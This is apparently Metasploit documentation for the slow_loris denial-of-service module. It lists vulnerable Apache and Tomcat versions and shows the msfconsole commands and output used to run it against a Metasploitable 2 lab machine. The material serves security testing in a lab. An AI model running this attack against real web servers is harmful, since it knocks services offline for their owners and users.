## Vulnerable Application

This module tries to keep many connections to the target web server open and hold them open as long as possible.

To test this module download and setup the Metasploitable 2 vulnerable Linux virtual machine available at [https://sourceforge.net/projects/metasploitable/files/Metasploitable2/](https://sourceforge.net/projects/metasploitable/files/Metasploitable2/).

Vulnerable app versions include:

- Apache HTTP Server 1.x and 2.x
- Apache Tomcat 5.5.0 through 5.5.29, 6.0.0 through 6.0.27 and 7.0.0 beta

## Verification Steps

1. Start msfconsole
2. Do: `use auxiliary/dos/http/slow_loris`
3. Do: `set RHOST`
4. Do: `run`
5. Visit server URL in your web-browser.

## Scenarios

### Apache/2.2.8 - Ubuntu 8.04

```
msf > use auxiliary/dos/http/slow_loris5
msf auxiliary(slow_loris5) > show options 

Module options (auxiliary/dos/http/slow_loris5):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HEADERS  10               yes       The number of custom headers sent by each thread
   RHOST                     yes       The target address
   RPORT    80               yes       The target port (TCP)
   THREADS  1000             yes       The number of concurrent threads

msf auxiliary(slow_loris5) > set RHOST 192.168.216.129
RHOST => 192.168.216.129
msf auxiliary(slow_loris5) > run

[*] 192.168.216.129:80 - Executing requests 1 - 1000...

```
